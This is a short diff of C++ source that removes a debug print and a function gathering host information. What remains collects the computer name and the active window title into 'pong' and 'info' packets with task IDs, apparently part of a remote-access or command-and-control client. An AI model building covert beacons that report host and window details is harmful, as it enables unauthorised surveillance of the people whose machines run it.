@@ -23,9 +23,6 @@ void util::Trim(wchar_t *src, int index, wchar_t *dst) {
 }
 
 void util::InitRetrieveInfo(struct INFO *info) {
-#ifdef DEBUG
-    wprintf(L"[DEBUG] InitRetrieveInfo\n");
-#endif
     wchar_t computer_name[32];
     event_handler::GetComputerName(computer_name);
     wcscpy(info->computer_name, computer_name);
@@ -57,22 +54,6 @@ void util::MakePong(packet *packet_) {
     wchar_t window_title[128];
     event_handler::GetActiveWindow(window_title);
     packet_->set_data(window_title);
-
-    packet_->set_current_index(0);
-    packet_->set_final_index(0);
-}
-
-void util::MakeInfo(packet *packet_) {
-    struct INFO init_info;
-    util::InitRetrieveInfo(&init_info);
-
-    packet_->set_type(PACKET_TYPE::INFO);
-
-    char id[16];
-    util::GenId(id, 16);
-    packet_->set_task_id(id);
-
-    packet_->set_data((wchar_t *) &init_info);
 
     packet_->set_current_index(0);
     packet_->set_final_index(0);
